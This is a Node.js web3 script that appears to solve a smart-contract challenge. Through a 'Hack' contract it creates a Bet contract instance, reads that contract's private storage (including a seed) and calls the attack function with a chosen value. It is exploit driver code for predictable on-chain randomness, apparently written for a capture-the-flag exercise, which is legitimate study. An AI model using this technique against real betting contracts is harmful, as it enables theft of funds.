const fs = require('fs')
const lib = require('./lib')(require('./config'))

web3 = lib.web3

async function main() {
    let tx = '0x98ce6019469f04289644e30253ec5304aa05eee6c5c026b9723f07bf77af81c9';
    web3.eth.getTransaction(tx)
    .then(console.log);
    web3.eth.getBlock(9012740)
        .then(console.log);
    let factory_address = '0x8e0a809B1f413deB6427535cC53383954DBF8329'
    let factory = lib.contract(factory_address, JSON.parse(fs.readFileSync('./Bet/factory.abi')))
    let hack_address = '0x5462CAfa70c7e1e6e69D22859A0F738c9B3fC944'
    let hack = lib.contract(hack_address, JSON.parse(fs.readFileSync('./Bet/Hack.abi')))
    let instance_address = await factory.view('instances', hack_address)
    if (instance_address === '0x0000000000000000000000000000000000000000') {
        await hack.call({value: web3.utils.toWei('0.5', 'ether')}, 'create', factory_address)
        instance_address = await factory.view('instances', hack_address)
    }
    let bet = lib.contract(instance_address, JSON.parse(fs.readFileSync('./Bet/bet.abi')))
    console.log(`instance = ${instance_address}`)
    let seed = await bet.storage(0)
    console.log(seed)
    console.log(await bet.storage(1))
    console.log(await bet.storage(2))
    console.log(await hack.storage(0))
    console.log(await hack.storage(1))
    await hack.call({value: web3.utils.toWei('0.00000001', 'ether')}, 'run', instance_address, 1604606885)
}

main()